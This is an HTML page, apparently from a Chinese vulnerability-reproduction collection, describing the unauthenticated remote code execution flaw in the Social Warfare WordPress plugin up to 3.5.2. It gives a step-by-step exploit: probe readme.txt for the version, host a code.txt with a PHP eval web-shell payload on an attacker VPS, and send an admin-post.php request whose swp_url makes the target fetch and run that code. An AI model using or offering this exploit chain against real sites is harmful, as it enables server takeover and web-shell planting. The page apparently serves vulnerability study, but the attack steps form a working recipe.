@@ -1,0 +1,33 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="wordpress-plugin---social-warfare352-rce"><span class="csDE05BCC">WordPress Plugin - Social Warfare&lt;=3.5.2 RCE</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">2019</span><span class="cs9C1B1871">年</span><span class="cs8926E06">3</span><span class="cs9C1B1871">月</span><span class="cs8926E06">21</span><span class="cs9C1B1871">日插件作者紧急发布了</span><span class="cs8926E06">3.5.3</span><span class="cs9C1B1871">版本以修复高危的</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">漏洞，在</span><span class="cs8926E06">&lt;=3.5.2</span><span class="cs9C1B1871">版本中存在一处无需登录即可</span><span class="cs8926E06">getshell</span><span class="cs9C1B1871">的</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">漏洞。</span></p><h2 class="cs868C439D">
+			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<h3 class="cs868C439D">
+			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">/wp-content/plugins/social-warfare/lib/utilities/SWP_Database_Migration.php</span><span class="cs9C1B1871">文件中有一处</span><span class="cs8926E06">eval()</span><span class="cs9C1B1871">函数，该函数将</span><span class="cs8926E06">file_get_contents()</span><span class="cs9C1B1871">读取的文件内容当做</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">代码执行导致</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_插件漏洞/WordPress%20Plugin%20-%20Social%20Warfare_=3.5.2%20RCE%20_files/image0.png" width="560" height="591" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
+			<a name="漏洞利用"><span class="csD6CA00D2">漏洞利用</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">第一步：刺探是否安装了</span><span class="cs8926E06">Social Warfare</span><span class="cs9C1B1871">插件</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/wp-content/plugins/social-warfare/readme.txt</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果存在</span><span class="cs8926E06">readme.txt</span><span class="cs9C1B1871">文件则说明已经安装该插件，并且从该</span><span class="cs8926E06">txt</span><span class="cs9C1B1871">文件中可获知插件的版本。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我的本机环境为</span><span class="cs8926E06">3.5.2</span><span class="cs9C1B1871">版本。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_插件漏洞/WordPress%20Plugin%20-%20Social%20Warfare_=3.5.2%20RCE%20_files/image1.png" width="560" height="328" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第二步：在自己的</span><span class="cs8926E06">VPS</span><span class="cs9C1B1871">服务器上放置一个</span><span class="cs8926E06">code.txt</span><span class="cs9C1B1871">文件，并启动</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">服务使该文件可通过</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">访问。文件内容如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;pre&gt;eval($_REQUEST[&#39;wpaa&#39;])&lt;/pre&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第三步：在未登陆任何账号的情况下直接访问如下链接即可</span><span class="cs8926E06">getshell</span><span class="cs9C1B1871">。</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://your_ip/code.txt&amp;wpaa=phpinfo();</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
+</html>
